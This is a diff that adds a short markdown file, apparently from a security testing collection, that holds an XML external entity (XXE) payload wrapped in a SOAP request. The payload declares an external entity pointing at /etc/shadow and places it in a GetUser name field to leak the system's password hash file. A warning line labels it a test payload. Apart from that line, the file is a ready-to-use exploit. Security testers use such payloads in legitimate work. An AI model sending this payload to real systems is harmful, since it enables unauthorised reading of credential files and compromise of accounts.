@@ -1,0 +1,13 @@
+# Marfaak AI Security - XXE in SOAP request
+
+**WARNING: This payload tests XXE in SOAP request.**
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Body>
+<GetUser><name>&xxe;</name></GetUser>
+</soapenv:Body>
+</soapenv:Envelope>
